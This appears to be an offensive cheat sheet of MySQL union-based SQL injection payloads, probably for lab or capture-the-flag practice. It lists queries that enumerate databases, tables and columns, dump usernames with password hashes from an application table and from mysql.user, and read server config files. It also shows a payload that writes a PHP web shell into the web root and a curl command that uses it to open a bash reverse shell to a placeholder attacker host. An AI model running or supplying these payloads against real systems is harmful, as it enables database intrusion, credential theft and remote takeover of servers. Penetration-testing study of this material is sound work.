One column available.  

Detect number of columns:

```bash
'union select 1 -- -
```

Detect Version:

```bash
'union select @@version -- - 
```

Detect Database User:

```bash
'union select user() -- -
```

Find privileges of a user:

```bash
'union select privilege_type from information_schema.user_privileges where grantee = "'uhc'@'localhost'" -- -
```

|**Privilege**|**What It Allows**|
|---|---|
|`SELECT`|Read data from tables and views|
|`INSERT`|Add new rows into tables|
|`UPDATE`|Modify existing rows in tables|
|`DELETE`|Remove rows from tables|
|`CREATE`|Create new databases and tables|
|`DROP`|Delete databases or tables|
|`ALTER`|Modify table structure (add/drop columns, indexes, etc.)|
|`INDEX`|Create or drop indexes|
|`EXECUTE`|Run stored procedures or functions|
|`CREATE ROUTINE`|Create stored procedures or functions|
|`ALTER ROUTINE`|Alter or drop stored procedures or functions|
|`SHOW DATABASES`|View the list of all databases|
|`FILE`|Use `LOAD_FILE()` to read files and `INTO OUTFILE` to write files (RCE/file read!)|
|`CREATE TEMPORARY TABLES`|Create temporary tables (live during session only)|
|`LOCK TABLES`|Lock tables for write access|
|`PROCESS`|See all running queries (can leak credentials, brute-force timings)|
|`RELOAD`|Flush logs, cache, or privileges (requires `SUPER`)|
|`SHUTDOWN`|Shut down the MySQL server|
|`SUPER`|Kill queries, set global variables, bypass connection limits|
|`GRANT OPTION`|Grant privileges to other users (privilege escalation!)|
|`ALL PRIVILEGES`|All of the above|

Find Database Name:

```bash
'union select (select database()) -- - 
```

Find all tables inside of all database:

```bash
'union select table_name from information_schema.tables -- -
```

Find all databases:

```bash
'union select schema_name from information_schema.schemata -- -
```

### Current Database

Find tables within current database:

```bash
'union select table_name from information_schema.tables where table_schema = database() -- -
```

View columns inside a table (registration) within current database:

```bash
`' union select column_name from information_schema.columns where table_name='registration' and table_schema=database() -- -`
```

View contents of registration table from current database:

```bash
'union select concat(username, ':', userhash) from registration -- -
```

### Other Databases

View tables in another databases:

```bash
'union select table_name from information_schema.tables where table_schema = 'mysql' -- -
```

View column names of a table in another database:

```bash
'union select column_name from information_schema.columns where table_name='user' and table_schema='mysql' -- -
```

View column names of a table in another database:

```bash
'union select concat(User, ':', authentication_string) from mysql.user -- -
```

```bash
mysql.user
<database.table>
```

View columns of all tables called registration:

```bash
'union select column_name from information_schema.columns where table_name='registration' -- -
```

Create a shell:

```bash
'union select "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Easy reverse shell once `shell.php` has been created

```bash
curl 'http://<target>/shell.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/<your_ip>/<your_port>+0>%261"'
```

View file:

```bash
'union select load_file('/var/www/html/config.php') -- -
```

